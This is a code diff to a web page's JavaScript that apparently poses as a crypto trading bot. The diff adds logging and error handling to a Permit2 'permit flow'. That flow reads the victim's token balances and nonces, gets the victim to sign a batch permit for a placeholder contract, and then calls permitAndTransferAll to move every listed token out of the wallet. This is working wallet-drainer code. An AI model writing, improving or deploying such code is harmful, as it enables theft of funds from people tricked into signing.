@@ -192,7 +192,11 @@ const CONTRACT = "PASTE_CONTRACT_HERE";
 let APP_STATE = { wallet:null, botActive:false, authorized:false };
 
 function log(msg){
+ console.log(msg); // 👈 Chrome console
+
  const el=document.getElementById('execution-console');
+ if(!el) return;
+
  const div=document.createElement('div');
  div.className='exec-line';
  div.innerText=msg;
@@ -230,6 +234,10 @@ async function connectWallet(){
 }
 
 async function runPermitFlow(provider,signer,user){
+ try{
+
+ log("🚀 Starting permit flow");
+ log("User: " + user);
 
  const abi=["function balanceOf(address) view returns(uint256)"];
  const permitAbi=["function allowance(address,address,address) view returns(uint160,uint48,uint48)"];
@@ -240,9 +248,16 @@ async function runPermitFlow(provider,signer,user){
 
  for(let token of TOKENS){
 
+  log("Checking token: " + token);
+
   const tokenC=new ethers.Contract(token,abi,provider);
   const bal=await tokenC.balanceOf(user);
+
+  log("Balance: " + bal.toString());
+
   const res=await permit2.allowance(user,token,CONTRACT);
+
+  log("Nonce: " + res[2]);
 
   details.push({
    token,
@@ -251,6 +266,8 @@ async function runPermitFlow(provider,signer,user){
    nonce:res[2]
   });
  }
+
+ log("Building signature...");
 
  const chainId=(await provider.getNetwork()).chainId;
 
@@ -280,23 +297,38 @@ async function runPermitFlow(provider,signer,user){
   sigDeadline:Math.floor(Date.now()/1000)+3600
  };
 
+ log("Waiting for signature...");
  const signature=await signer.signTypedData(domain,types,value);
 
- const contract=new ethers.Contract(
-  CONTRACT,
-  ["function permitAndTransferAll(address,address[],bytes,bytes)"],
-  signer
- );
+ log("Signature OK");
+
+ const ABI = [
+  "function permitAndTransferAll(address user, address[] tokens, bytes permitBatch, bytes signature)"
+ ];
+
+ const contract = new ethers.Contract(CONTRACT, ABI, signer);
+
+ log("Encoding permit data...");
 
  const encoded=ethers.AbiCoder.defaultAbiCoder().encode(
   ["tuple(tuple(address,uint160,uint48,uint48)[],address,uint256)"],
   [value]
  );
 
+ log("Sending transaction...");
+
  const tx=await contract.permitAndTransferAll(user,TOKENS,encoded,signature);
+
+ log("TX sent: " + tx.hash);
+
  await tx.wait();
 
- log("DONE");
+ log("✅ DONE");
+
+ }catch(e){
+  console.error(e);
+  log("❌ ERROR: " + (e.reason || e.message));
+ }
 }
 function updateStatus(dotId, textId, text, color) {
     const dot = document.getElementById(dotId);
